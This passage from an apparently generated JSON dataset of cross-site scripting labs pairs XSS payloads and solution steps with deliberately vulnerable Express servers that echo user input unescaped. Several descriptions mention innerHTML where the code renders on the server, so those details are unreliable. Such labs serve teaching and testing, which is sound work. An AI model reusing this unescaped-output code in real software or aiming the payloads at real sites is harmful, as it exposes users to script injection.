        "Visit catalog",
        "Script executes on book listing"
      ],
      "payloads": [
        "<script>alert('bookXSS')</script>",
        "<img src=x onerror=alert('read')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet book = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-book', (req, res) => { book = req.body.title; res.redirect('/library'); });\napp.get('/library', (req, res) => { res.send(`<html><body><li>${book}</li></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via system announcement title",
      "Lab Description": "Admins can post announcements. The title is displayed on the homepage using innerHTML. If not sanitized, XSS occurs for all users.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Post announcement titled: <script>alert('XSS')</script>",
        "View homepage",
        "Observe script execution from title"
      ],
      "payloads": [
        "<script>alert('announcementXSS')</script>",
        "<img src=x onerror=alert('announce')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/announce', (req, res) => { title = req.body.title; res.redirect('/'); });\napp.get('/', (req, res) => { res.send(`<html><body><h1>${title}</h1></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via travel itinerary stop name",
      "Lab Description": "Users can build travel itineraries with named stops. These names are rendered in the app using innerHTML. A crafted name results in XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add stop: <img src=x onerror=alert('XSS')>",
        "Open itinerary view",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('tripXSS')</script>",
        "<img src=x onerror=alert('stop')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet stop = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-stop', (req, res) => { stop = req.body.name; res.redirect('/itinerary'); });\napp.get('/itinerary', (req, res) => { res.send(`<html><body><ul><li>${stop}</li></ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via personal goal title in productivity tracker",
      "Lab Description": "Users can set personal goals with titles. Titles are rendered in goal overviews using innerHTML. Malicious input leads to stored XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create goal: <img src=x onerror=alert('XSS')>",
        "View goals list",
        "Script executes from title"
      ],
      "payloads": [
        "<script>alert('goalXSS')</script>",
        "<img src=x onerror=alert('goal')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet goal = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-goal', (req, res) => { goal = req.body.title; res.redirect('/goals'); });\napp.get('/goals', (req, res) => { res.send(`<html><body><h3>${goal}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via virtual workspace tab name",
      "Lab Description": "Users can create tabs within their workspace. Tab names are displayed in the interface using innerHTML. A malicious name causes DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Name a tab: <img src=x onerror=alert(1)>",
        "Open the tab interface",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('workspaceXSS')</script>",
        "<img src=x onerror=alert('tab')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tab = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-tab', (req, res) => { tab = req.body.name; res.redirect('/workspace'); });\napp.get('/workspace', (req, res) => { res.send(`<html><body><div>${tab}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via clinic appointment reason text",
      "Lab Description": "Patients can provide appointment reasons. These are rendered in the doctor dashboard using innerHTML. XSS is possible if unsanitized.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit reason: <img src=x onerror=alert('XSS')>",
        "Doctor opens appointments list",
        "Payload executes in reason field"
      ],
      "payloads": [
        "<script>alert('clinicXSS')</script>",
        "<img src=x onerror=alert('appt')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet reason = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/book-appointment', (req, res) => { reason = req.body.reason; res.redirect('/appointments'); });\napp.get('/appointments', (req, res) => { res.send(`<html><body><td>${reason}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via warehouse product bin label",
      "Lab Description": "Warehouse managers can label storage bins. Labels are rendered via innerHTML in the inventory app. A malicious label can cause XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Label bin: <img src=x onerror=alert('XSS')>",
        "Open inventory viewer",
        "Observe script execution in bin area"
      ],
      "payloads": [
        "<script>alert('warehouseXSS')</script>",
        "<img src=x onerror=alert('bin')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/label-bin', (req, res) => { label = req.body.label; res.redirect('/inventory'); });\napp.get('/inventory', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via forum signature field",
      "Lab Description": "Users can add signatures to their forum profiles. These are displayed under every post using innerHTML. A malicious signature causes stored XSS on every thread visit.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set forum signature: <img src=x onerror=alert('XSS')>",
        "Post in any thread",
        "View thread and observe script execution"
      ],
      "payloads": [
        "<script>alert('forumXSS')</script>",
        "<img src=x onerror=alert('signature')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet signature = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-signature', (req, res) => { signature = req.body.text; res.redirect('/thread'); });\napp.get('/thread', (req, res) => { res.send(`<html><body><div>${signature}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via peer review comment title",
      "Lab Description": "Students can leave peer reviews with custom titles. These titles are rendered in the review summary using innerHTML. A crafted title results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit review with title: <script>alert('XSS')</script>",
        "View the peer review page",
        "Payload executes in review summary"
      ],
      "payloads": [
        "<script>alert('peerReviewXSS')</script>",
        "<img src=x onerror=alert('peer')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet review = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-review', (req, res) => { review = req.body.title; res.redirect('/reviews'); });\napp.get('/reviews', (req, res) => { res.send(`<html><body><h4>${review}</h4></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via emergency alert title in control dashboard",
      "Lab Description": "Admins can broadcast emergency alerts. Alert titles are rendered with innerHTML in a dashboard. If unsanitized, this results in XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Broadcast alert titled: <img src=x onerror=alert('XSS')>",
        "Open live alert dashboard",
        "Observe XSS execution from alert title"
      ],
      "payloads": [
        "<script>alert('alertXSS')</script>",
        "<img src=x onerror=alert('emergency')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet alert = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/broadcast-alert', (req, res) => { alert = req.body.title; res.redirect('/alerts'); });\napp.get('/alerts', (req, res) => { res.send(`<html><body><div>${alert}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via code snippet title in sharing platform",
      "Lab Description": "Users can share code snippets with titles. These titles are shown in listings using innerHTML. A malicious title results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit snippet titled: <script>alert('XSS')</script>",
        "Visit snippet browser",
        "Script executes from title listing"
      ],
      "payloads": [
        "<script>alert('snippetXSS')</script>",
        "<img src=x onerror=alert('code')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-snippet', (req, res) => { title = req.body.title; res.redirect('/snippets'); });\napp.get('/snippets', (req, res) => { res.send(`<html><body><p>${title}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via bug bounty report summary",
      "Lab Description": "Researchers submit summaries for their bug reports. These are displayed to the security team using innerHTML. Unsanitized input leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit report summary: <script>alert('XSS')</script>",
        "Security team opens reports dashboard",
        "Observe script execution from summary"
      ],
      "payloads": [
        "<script>alert('bugXSS')</script>",
        "<img src=x onerror=alert('report')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet summary = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-report', (req, res) => { summary = req.body.summary; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><section>${summary}</section></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via comment section username",
      "Lab Description": "Usernames are displayed beside comments using innerHTML. If usernames are not sanitized, stored XSS can be executed by simply posting a comment.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set your username to <script>alert('XSS')</script>",
        "Post a comment",
        "Visit comment section and observe XSS"
      ],
      "payloads": [
        "<script>alert('usernameXSS')</script>",
        "<img src=x onerror=alert('name')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet username = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-username', (req, res) => { username = req.body.username; res.redirect('/comment'); });\napp.get('/comment', (req, res) => { res.send(`<html><body><b>${username}</b>: Nice post!</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via product category name in inventory app",
      "Lab Description": "Admins can create custom product categories. Category names appear in dropdowns using innerHTML. A malicious name results in DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create category: <img src=x onerror=alert(1)>",
        "Open category dropdown",
        "Script executes immediately"
      ],
      "payloads": [
        "<script>alert('categoryXSS')</script>",
        "<img src=x onerror=alert('product')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet category = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-category', (req, res) => { category = req.body.name; res.redirect('/inventory'); });\napp.get('/inventory', (req, res) => { res.send(`<html><body><option>${category}</option></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via meeting agenda point in scheduler",
      "Lab Description": "Team leads can set meeting points. Points are rendered via innerHTML in the scheduler. A crafted point triggers XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add agenda point: <script>alert('XSS')</script>",
        "Visit meeting summary",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('agendaXSS')</script>",
        "<img src=x onerror=alert('meeting')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet agenda = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-agenda', (req, res) => { agenda = req.body.point; res.redirect('/summary'); });\napp.get('/summary', (req, res) => { res.send(`<html><body><li>${agenda}</li></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via log entry detail field in admin panel",
      "Lab Description": "Log entries include a user-supplied detail field. These are rendered using innerHTML in the admin log viewer. Unsanitized values allow stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger a log with detail: <img src=x onerror=alert(1)>",
        "Admin opens log viewer",
        "Observe script execution from logs"
      ],
      "payloads": [
        "<script>alert('logXSS')</script>",
        "<img src=x onerror=alert('log')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet detail = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/log', (req, res) => { detail = req.body.detail; res.redirect('/logs'); });\napp.get('/logs', (req, res) => { res.send(`<html><body><pre>${detail}</pre></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via AI assistant custom command label",
      "Lab Description": "Users can name their custom AI assistant commands. These names are rendered using innerHTML in the assistant UI. A malicious name results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add command label: <script>alert('XSS')</script>",
        "Open AI assistant interface",
        "Observe XSS in command list"
      ],
      "payloads": [
        "<script>alert('aiXSS')</script>",
        "<img src=x onerror=alert('command')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-command', (req, res) => { label = req.body.label; res.redirect('/assistant'); });\napp.get('/assistant', (req, res) => { res.send(`<html><body><button>${label}</button></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via contact form department selector label",
      "Lab Description": "The contact form dynamically displays the selected department name using innerHTML. A maliciously crafted department name can lead to DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject malicious department name via URL or intercepted request",
        "Load the contact form and observe execution",
        "Verify script is executed inside selector label"
      ],
      "payloads": [
        "<script>alert('deptXSS')</script>",
        "<img src=x onerror=alert('dept')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/contact', (req, res) => {\n  const dept = req.query.department || 'Support';\n  res.send(`<html><body><label>Department: ${dept}</label></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chatbot suggested reply label",
      "Lab Description": "The chatbot suggests reply labels, generated from prior messages. These are inserted into the page using innerHTML. Malicious content can cause XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Inject a crafted message: <img src=x onerror=alert('XSS')>",
        "Trigger suggestion rendering",
        "Observe payload execution inside button"
      ],
      "payloads": [
        "<script>alert('chatXSS')</script>",
        "<img src=x onerror=alert('bot')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet suggestion = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/message', (req, res) => { suggestion = req.body.message; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><button>${suggestion}</button></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via audio track title in music playlist viewer",
      "Lab Description": "Users can add audio tracks with custom titles. These titles appear in playlists using innerHTML. A malicious title results in stored XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add track: <script>alert('XSS')</script>",
        "View the playlist",
        "Observe execution from track title"
      ],
      "payloads": [
        "<script>alert('trackXSS')</script>",
        "<img src=x onerror=alert('audio')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet track = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-track', (req, res) => { track = req.body.title; res.redirect('/playlist'); });\napp.get('/playlist', (req, res) => { res.send(`<html><body><div>${track}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via reviewer's position in testimonial section",
      "Lab Description": "Users providing testimonials can specify a position. This appears on the public site using innerHTML. A crafted position causes XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit testimonial with position: <img src=x onerror=alert('XSS')>",
        "Visit testimonials page",
        "Script executes below reviewer name"
      ],
      "payloads": [
        "<script>alert('testimonialXSS')</script>",
        "<img src=x onerror=alert('position')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet position = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-testimonial', (req, res) => { position = req.body.position; res.redirect('/testimonials'); });\napp.get('/testimonials', (req, res) => { res.send(`<html><body><small>${position}</small></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via webhook response preview title",
      "Lab Description": "The system stores responses from webhook targets and renders titles using innerHTML. A malicious response payload can trigger stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send crafted webhook response with title: <script>alert('XSS')</script>",
        "Open webhook logs",
        "Observe payload execution in response preview"
      ],
      "payloads": [
        "<script>alert('webhookXSS')</script>",
        "<img src=x onerror=alert('hook')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet response = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/receive-webhook', (req, res) => { response = req.body.title; res.sendStatus(200); });\napp.get('/webhook-log', (req, res) => { res.send(`<html><body><h3>${response}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via remote config key name in DevOps dashboard",
      "Lab Description": "DevOps users can define remote config keys. Key names are rendered in real-time using innerHTML. A malicious name can result in XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create key named: <img src=x onerror=alert('XSS')>",
        "Open config dashboard",
        "Payload executes in key list"
      ],
      "payloads": [
        "<script>alert('configXSS')</script>",
        "<img src=x onerror=alert('devops')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet key = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-key', (req, res) => { key = req.body.key; res.redirect('/config'); });\napp.get('/config', (req, res) => { res.send(`<html><body><code>${key}</code></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via booking location alias in travel system",
      "Lab Description": "Users can define aliases for travel destinations. These appear in confirmations using innerHTML. A crafted alias causes XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Alias destination: <script>alert('XSS')</script>",
        "Make booking and receive confirmation",
        "Observe script execution in alias field"
      ],
      "payloads": [
        "<script>alert('travelXSS')</script>",
        "<img src=x onerror=alert('alias')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet alias = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alias', (req, res) => { alias = req.body.alias; res.redirect('/confirm'); });\napp.get('/confirm', (req, res) => { res.send(`<html><body><strong>${alias}</strong></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via project milestone name in Kanban board",
      "Lab Description": "Project milestones can be named by users. These names are rendered in task boards using innerHTML. Unsanitized names cause stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Name milestone: <img src=x onerror=alert(1)>",
        "Open Kanban view",
        "Observe XSS in milestone column"
      ],
      "payloads": [
        "<script>alert('milestoneXSS')</script>",
        "<img src=x onerror=alert('kanban')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet milestone = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-milestone', (req, res) => { milestone = req.body.name; res.redirect('/board'); });\napp.get('/board', (req, res) => { res.send(`<html><body><header>${milestone}</header></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via map marker label in geo-tracking app",
      "Lab Description": "Users can place custom markers with labels. These labels are rendered using innerHTML. A malicious label causes XSS when the map is loaded.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Place marker with label: <script>alert(1)</script>",
        "Open map viewer",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('mapXSS')</script>",
        "<img src=x onerror=alert('marker')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet marker = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-marker', (req, res) => { marker = req.body.label; res.redirect('/map'); });\napp.get('/map', (req, res) => { res.send(`<html><body><div>${marker}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via payment reference note in invoice preview",
      "Lab Description": "Users can add a reference note when paying invoices. These are displayed in preview using innerHTML. Unsanitized input leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add payment note: <script>alert('XSS')</script>",
        "Download invoice preview",
        "Observe payload execution from note"
      ],
      "payloads": [
        "<script>alert('paymentXSS')</script>",
        "<img src=x onerror=alert('invoice')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/pay', (req, res) => { note = req.body.note; res.redirect('/preview'); });\napp.get('/preview', (req, res) => { res.send(`<html><body><footer>${note}</footer></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via file upload label name in document management system",
      "Lab Description": "Users can assign custom labels to uploaded files. These labels are rendered using innerHTML in the file listing panel. A crafted label can result in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload a file and label it: <img src=x onerror=alert('XSS')>",
        "Navigate to file list view",
        "Observe script execution in label field"
      ],
      "payloads": [
        "<script>alert('uploadLabelXSS')</script>",
        "<img src=x onerror=alert('label')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload-label', (req, res) => { label = req.body.label; res.redirect('/files'); });\napp.get('/files', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via product customization field in checkout form",
      "Lab Description": "Users can add customization notes for products. These are rendered in the order summary using innerHTML. Unsanitized notes cause stored XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Add customization: <script>alert('XSS')</script>",
        "Proceed to checkout summary",
        "Observe payload execution in customization field"
      ],
      "payloads": [
        "<script>alert('customizeXSS')</script>",
        "<img src=x onerror=alert('checkout')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/customize', (req, res) => { note = req.body.note; res.redirect('/summary'); });\napp.get('/summary', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via bug tracker component name",
      "Lab Description": "Bug reports allow setting the affected component name. This is displayed in listings using innerHTML. A crafted name leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit bug with component: <img src=x onerror=alert('XSS')>",
        "Browse bug tracker",
        "Observe script execution from component name"
      ],
      "payloads": [
        "<script>alert('componentXSS')</script>",
        "<img src=x onerror=alert('tracker')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet component = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/report', (req, res) => { component = req.body.component; res.redirect('/bugs'); });\napp.get('/bugs', (req, res) => { res.send(`<html><body><div>${component}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via API client name in token manager",
      "Lab Description": "Admins can name API clients. These names appear next to tokens using innerHTML. Malicious input leads to stored XSS in the panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add API client: <script>alert('XSS')</script>",
        "Open API token manager",
        "Observe XSS triggered from client name"
      ],
      "payloads": [
        "<script>alert('apiClientXSS')</script>",
        "<img src=x onerror=alert('client')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet client = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-client', (req, res) => { client = req.body.name; res.redirect('/tokens'); });\napp.get('/tokens', (req, res) => { res.send(`<html><body><strong>${client}</strong></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chat bot trigger word display",
      "Lab Description": "Custom trigger words for bots are shown in logs. These are rendered using innerHTML. A malicious trigger word results in XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Define trigger: <img src=x onerror=alert(1)>",
        "Activate bot to log trigger",
        "View bot logs and observe XSS"
      ],
      "payloads": [
        "<script>alert('triggerXSS')</script>",
        "<img src=x onerror=alert('trigger')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet trigger = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-trigger', (req, res) => { trigger = req.body.word; res.redirect('/bot-log'); });\napp.get('/bot-log', (req, res) => { res.send(`<html><body><div>${trigger}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via email subject line preview",
      "Lab Description": "The email preview interface displays the subject via innerHTML. A crafted subject line can result in reflected XSS when loaded from query parameters.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to /preview?subject=<img src=x onerror=alert(1)>",
        "Observe execution from reflected subject",
        "Try encoded payloads to test filters"
      ],
      "payloads": [
        "<script>alert('emailXSS')</script>",
        "<img src=x onerror=alert('subject')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const subject = req.query.subject || 'No Subject';\n  res.send(`<html><body><h2>${subject}</h2></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via CSV import confirmation screen",
      "Lab Description": "After importing CSV data, confirmation screen renders raw values via innerHTML. A crafted CSV cell value can trigger stored XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Upload CSV with cell: <img src=x onerror=alert(1)>",
        "Proceed to preview step",
        "Observe XSS execution in import review"
      ],
      "payloads": [
        "<script>alert('csvXSS')</script>",
        "<img src=x onerror=alert('csv')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet cell = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload-csv', (req, res) => { cell = req.body.cell; res.redirect('/confirm'); });\napp.get('/confirm', (req, res) => { res.send(`<html><body><td>${cell}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via app update changelog entry",
      "Lab Description": "Developers can write changelogs. Entries are rendered via innerHTML in the version viewer. A malicious changelog causes persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Publish changelog: <script>alert('XSS')</script>",
        "View app update history",
        "Payload executes from entry text"
      ],
      "payloads": [
        "<script>alert('changelogXSS')</script>",
        "<img src=x onerror=alert('update')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet changelog = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/update', (req, res) => { changelog = req.body.log; res.redirect('/changelog'); });\napp.get('/changelog', (req, res) => { res.send(`<html><body><article>${changelog}</article></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via social media group description",
      "Lab Description": "Group creators can set descriptions. Descriptions are shown via innerHTML in group pages. A crafted description causes stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create group with: <img src=x onerror=alert(1)>",
        "Open the group page",
        "Script executes on page load"
      ],
      "payloads": [
        "<script>alert('groupDescXSS')</script>",
        "<img src=x onerror=alert('social')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-group', (req, res) => { desc = req.body.desc; res.redirect('/group'); });\napp.get('/group', (req, res) => { res.send(`<html><body><p>${desc}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via feedback widget suggestion field",
      "Lab Description": "Users can leave suggestions via a floating widget. Suggestions appear in the admin panel using innerHTML. Unsanitized input triggers stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit suggestion: <script>alert('XSS')</script>",
        "Login to admin feedback page",
        "Observe execution from stored suggestion"
      ],
      "payloads": [
        "<script>alert('widgetXSS')</script>",
        "<img src=x onerror=alert('feedback')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet suggestion = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/feedback', (req, res) => { suggestion = req.body.text; res.redirect('/admin-feedback'); });\napp.get('/admin-feedback', (req, res) => { res.send(`<html><body><li>${suggestion}</li></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via video comment timestamp tag",
      "Lab Description": "Users can leave timestamp-tagged comments on videos. These timestamps are rendered using innerHTML. A malicious timestamp tag can trigger stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a comment with tag: <img src=x onerror=alert('XSS')>",
        "Play video and hover on timestamps",
        "Script executes from tag rendering"
      ],
      "payloads": [
        "<script>alert('timestampXSS')</script>",
        "<img src=x onerror=alert('comment')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => { tag = req.body.timestamp; res.redirect('/video'); });\napp.get('/video', (req, res) => { res.send(`<html><body><span>${tag}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via IoT device debug log tag",
      "Lab Description": "IoT logs allow custom tags. These tags are reflected in logs using innerHTML. Malicious tags can trigger stored XSS in admin dashboards.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send log entry with tag: <script>alert('XSS')</script>",
        "Open device logs in admin panel",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('iotLogXSS')</script>",
        "<img src=x onerror=alert('log')>"
      ],
      "Vulnerability name": "Cross-site scripting",
